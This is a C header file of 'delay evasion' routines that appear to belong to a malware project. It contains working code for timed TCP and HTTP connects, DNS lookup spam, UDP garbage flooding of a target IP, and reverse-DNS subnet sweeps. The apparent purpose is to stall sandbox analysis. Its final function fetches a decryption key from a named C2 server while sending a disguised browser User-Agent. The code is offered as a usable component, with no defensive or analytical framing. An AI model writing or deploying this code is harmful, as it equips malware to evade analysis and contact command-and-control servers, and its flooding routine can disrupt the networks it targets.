/* include/network.h - Network Protocol & I/O Delay Evasion Routines */
#ifndef NETWORK_H
#define NETWORK_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/select.h>

/**
 * Initiates a non-blocking TCP socket connection attempt to a specified target IP and port,
 * enforcing a maximum blocking duration using select().
 *
 * @param ip Target IPv4 address string.
 * @param port Target TCP port number.
 * @param timeout_sec Maximum duration in seconds to wait for connection state.
 * @return 1 on completion.
 */
static inline int delay_tcp_timeout(const char* ip, int port, unsigned int timeout_sec) {
    if (timeout_sec == 0) return 1;

    time_t start_time = time(NULL);

    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s >= 0) {
        // Configure socket for non-blocking I/O
        int flags = fcntl(s, F_GETFL, 0);
        fcntl(s, F_SETFL, flags | O_NONBLOCK);

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &addr.sin_addr);

        connect(s, (struct sockaddr*)&addr, sizeof(addr));

        // Wait for connection outcome or timeout via select()
        struct timeval tv;
        tv.tv_sec = (time_t)timeout_sec;
        tv.tv_usec = 0;

        fd_set fdset;
        FD_ZERO(&fdset);
        FD_SET(s, &fdset);

        select(s + 1, NULL, &fdset, NULL, &tv);
        close(s);
    }

    // Ensure total execution time matches requested delay duration
    time_t elapsed = time(NULL) - start_time;
    if (elapsed < (time_t)timeout_sec) {
        sleep(timeout_sec - (unsigned int)elapsed);
    }

    return 1;
}

/**
 * Issues repetitive DNS lookups for non-existent internal hostnames to delay execution.
 *
 * @param count Number of DNS resolution attempts to execute.
 */
static inline void delay_dns_lookup_spam(unsigned int count) {
    for (unsigned int i = 0; i < count; i++) {
        char domain[128];
        snprintf(domain, sizeof(domain), "internal-server-%ld-%u.local", time(NULL), i);
        gethostbyname(domain);
    }
}

/**
 * Sends a raw HTTP GET request to a remote host and blocks waiting for a response or socket timeout.
 *
 * @param host_or_ip Hostname or IP address of target web server.
 * @param timeout_sec Read/write socket timeout threshold in seconds.
 */
static inline void delay_http_request(const char* host_or_ip, unsigned int timeout_sec) {
    if (timeout_sec == 0) return;

    time_t start_time = time(NULL);

    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s >= 0) {
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(80);

        if (inet_pton(AF_INET, host_or_ip, &addr.sin_addr) <= 0) {
            struct hostent *server = gethostbyname(host_or_ip);
            if (server != NULL) {
                memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
            }
        }

        // Configure receive and send socket timeouts
        struct timeval tv;
        tv.tv_sec = (time_t)timeout_sec;
        tv.tv_usec = 0;
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));

        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            char req[256];
            snprintf(req, sizeof(req), "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", host_or_ip);
            send(s, req, strlen(req), 0);

            // Read response until timeout expires or data arrives
            char buffer[1024];
            recv(s, buffer, sizeof(buffer), 0);
        }
        close(s);
    }

    // Ensure total execution time matches requested delay duration
    time_t elapsed = time(NULL) - start_time;
    if (elapsed < (time_t)timeout_sec) {
        sleep(timeout_sec - (unsigned int)elapsed);
    }
}

/**
 * Binds a UDP socket to a designated local port and blocks waiting for incoming datagrams.
 *
 * @param port Local UDP port to bind.
 * @param timeout_sec Maximum listen timeout in seconds.
 */
static inline void delay_udp_recv(int port, unsigned int timeout_sec) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    bind(s, (struct sockaddr*)&addr, sizeof(addr));

    struct timeval tv;
    tv.tv_sec = (time_t)timeout_sec;
    tv.tv_usec = 0;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));

    char buffer[1024];
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);

    recvfrom(s, buffer, sizeof(buffer), 0, (struct sockaddr*)&client_addr, &addr_len);
    close(s);
}

/**
 * Dispatches an NTP v3 time synchronization request packet over UDP to a time server.
 *
 * @param server_name Hostname or IP of NTP server.
 * @param timeout_sec Maximum wait duration in seconds.
 */
static inline void delay_ntp_sync_check(const char* server_name, unsigned int timeout_sec) {
    if (timeout_sec == 0) return;

    time_t start_time = time(NULL);

    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s >= 0) {
        struct hostent *server = gethostbyname(server_name);
        if (server != NULL) {
            struct sockaddr_in addr;
            memset(&addr, 0, sizeof(addr));
            addr.sin_family = AF_INET;
            addr.sin_port = htons(123);
            memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);

            // Formulate standard NTP v3 client query packet (0x1B)
            unsigned char msg[48] = {0x1B, 0};

            struct timeval tv;
            tv.tv_sec = (time_t)timeout_sec;
            tv.tv_usec = 0;
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));

            sendto(s, msg, sizeof(msg), 0, (struct sockaddr*)&addr, sizeof(addr));
            recvfrom(s, msg, sizeof(msg), 0, NULL, NULL);
        }
        close(s);
    }

    // Guarantee exact requested execution delay duration
    time_t elapsed = time(NULL) - start_time;
    if (elapsed < (time_t)timeout_sec) {
        sleep(timeout_sec - (unsigned int)elapsed);
    }
}

/**
 * Transmits continuous UDP garbage payloads to induce network buffer pressure and I/O delay.
 *
 * @param target_ip Target IPv4 address.
 * @param iterations Total packet transmission count.
 */
static inline void delay_network_garbage(const char* target_ip, unsigned int iterations) {
    if (iterations == 0) return;

    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return;

    // Increase socket send buffer size
    int sndbuf = 65536;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    char garbage[1400];
    memset(garbage, 0xA5, sizeof(garbage));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(9999);
    inet_pton(AF_INET, target_ip, &addr.sin_addr);

    for (unsigned int i = 0; i < iterations; i++) {
        // Block and retry if output buffer becomes temporarily saturated
        while (sendto(s, garbage, sizeof(garbage), 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            // Kernel backpressure handles loop delay during ENOBUFS/EAGAIN
        }
    }

    close(s);
}

/**
 * Performs repeated reverse DNS ptr resolutions across an IP address range.
 *
 * @param base_ip Subnet prefix IP address string (e.g., "192.168.1.").
 * @param total_checks Number of reverse host resolution attempts.
 */
static inline void delay_reverse_dns(const char* base_ip, unsigned int total_checks) {
    for (unsigned int i = 1; i <= total_checks; i++) {
        char ip[32];
        snprintf(ip, sizeof(ip), "%s%u", base_ip, (i % 254) + 1);

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        inet_pton(AF_INET, ip, &addr.sin_addr);

        char host[NI_MAXHOST];
        getnameinfo((struct sockaddr*)&addr, sizeof(addr), host, sizeof(host), NULL, 0, NI_NAMEREQD);
    }
}

/**
 * Issues an HTTP GET request to a remote C2 server to dynamically fetch a decryption key into memory.
 *
 * @param host_or_ip C2 server hostname or IPv4 address.
 * @param port Target TCP port (e.g., 80, 8080, 443).
 * @param uri_path Key endpoint URI path (e.g., "/api/v1/get_key").
 * @param out_key Pointer to output buffer where the retrieved key will be stored.
 * @param max_key_len Maximum size of the destination key buffer.
 * @param timeout_sec Maximum socket timeout in seconds.
 * @return Number of bytes written to out_key on success, or -1 on network/HTTP failure.
 */
static inline int delay_c2_key_retrieval(const char* host_or_ip, int port, const char* uri_path, char* out_key, size_t max_key_len, unsigned int timeout_sec) {
    if (!host_or_ip || !uri_path || !out_key || max_key_len == 0) return -1;

    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)port);

    // Resolve IP or domain
    if (inet_pton(AF_INET, host_or_ip, &addr.sin_addr) <= 0) {
        struct hostent *server = gethostbyname(host_or_ip);
        if (server == NULL) {
            close(s);
            return -1;
        }
        memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
    }

    // Configure socket timeouts
    struct timeval tv;
    tv.tv_sec = (time_t)(timeout_sec > 0 ? timeout_sec : 10);
    tv.tv_usec = 0;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));

    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        close(s);
        return -1;
    }

    // Formulate HTTP GET request
    char req[512];
    snprintf(req, sizeof(req), 
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
             "Connection: close\r\n\r\n", 
             uri_path, host_or_ip);

    if (send(s, req, strlen(req), 0) < 0) {
        close(s);
        return -1;
    }

    // Read full HTTP response
    char response[2048];
    memset(response, 0, sizeof(response));
    ssize_t bytes_received = recv(s, response, sizeof(response) - 1, 0);
    close(s);

    if (bytes_received <= 0) return -1;

    // Separate HTTP header from payload body (\r\n\r\n)
    char* body = strstr(response, "\r\n\r\n");
    if (!body) return -1;
    body += 4; // Advance pointer past CRLFCRLF

    size_t key_len = strlen(body);
    
    // Strip potential trailing newline/carriage return from HTTP response body
    while (key_len > 0 && (body[key_len - 1] == '\r' || body[key_len - 1] == '\n')) {
        body[key_len - 1] = '\0';
        key_len--;
    }

    if (key_len == 0 || key_len >= max_key_len) return -1;

    // Copy key into provided memory buffer
    memcpy(out_key, body, key_len);
    out_key[key_len] = '\0';

    return (int)key_len;
}

#endif // NETWORK_H
